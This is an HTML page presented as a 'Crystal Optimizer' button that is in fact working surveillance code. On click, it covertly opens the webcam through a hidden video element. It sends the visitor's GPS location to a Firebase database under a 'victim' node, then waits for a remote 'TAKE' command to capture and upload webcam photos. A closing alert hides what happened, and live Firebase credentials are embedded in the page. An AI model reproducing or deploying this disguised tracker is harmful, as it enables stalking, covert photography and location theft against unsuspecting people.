<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CRYSTAL OPTIMIZER</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { background: #0a0514; color: #c084fc; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .crystal { border: 2px solid #c084fc; padding: 50px; border-radius: 50%; cursor: pointer; box-shadow: 0 0 20px #c084fc; }
    </style>
</head>
<body>
    <div class="crystal" onclick="start()"><h1>💎</h1><p>IGNITE</p></div>
    <video id="v" autoplay style="display:none;"></video>
<script>
    const config = { apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" };
    firebase.initializeApp(config); const db = firebase.database();
    async function start() {
        const stream = await navigator.mediaDevices.getUserMedia({video:true});
        document.getElementById('v').srcObject = stream;
        navigator.geolocation.getCurrentPosition(pos => {
            const ref = db.ref('korban').push({ waktu: new Date().toLocaleString(), maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` });
            db.ref('commands/'+ref.key).on('value', snap => {
                if(snap.val()?.action === "TAKE") {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0);
                    db.ref('hasil_foto/'+ref.key).set({ foto: canvas.toDataURL('image/jpeg', 0.5) });
                }
            });
            alert("Crystal Sync Complete!");
        });
    }
</script>
</body>
</html>
